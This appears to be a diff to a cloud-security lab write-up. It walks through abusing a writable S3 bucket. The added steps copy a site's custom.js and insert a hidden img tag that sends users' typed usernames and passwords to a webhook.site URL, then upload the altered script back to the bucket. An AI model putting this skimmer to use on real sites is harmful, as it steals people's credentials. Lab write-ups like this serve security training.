@@ -24,4 +24,33 @@ Checking the other bucket `aws s3 ls s3://s3-file-load-static-402113608956/stati
 Check the bucket policy `aws s3api get-bucket-policy --bucket s3-file-load-static-402113608956 --output text  --profile PTAcademyJllerena | jq `
 ![image](https://user-images.githubusercontent.com/46797181/227758140-4c74218c-a0c4-42ae-a4fa-8ba11114025b.png)
 
+Copy custom.js script from the bucket to local machine. `aws s3 cp s3://s3-file-load-static-402113608956/static/javascript/custom.js ./ --profile PTAcademyJllerena`
+Modify custom.js to steal credentials from the webpage and send them to a custom attacker’s server. The file will look like this
+
+```
+function makeRequest() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("output").innerHTML = this.responseText;
+}
+if (this.readyState == 4 && this.status != 200) {
+document.getElementById("output").innerHTML = "Invalid Credentials";
+}
+};
+var url = 'https://ahyk95vfo5.execute-api.us-west-2.amazonaws.com/dev?username=' + $('#pi3').val() + '&password=' + $('#pi4').val()
+xhttp.open("GET", url, true);
+xhttp.send();
+element=document.getElementById('pi3');
+element.innerHTML +="<img src='https://webhook.site/51655c62-39b0-41d5-a79f-db620b78a77f/?username="+$('#pi3').val()+"&password="+$('#pi4').val()+"' style = 'display:none'>"
+}
+
+```
+
+Then upload the js file back to the bucket. `aws s3 cp custom.js s3://s3-file-load-static-402113608956/static/javascript/custom.js --profile PTAcademyJllerena`
+
+![image](https://user-images.githubusercontent.com/46797181/227759373-afd93298-c822-470b-a36c-99f98a34b609.png)
+
+
+
 
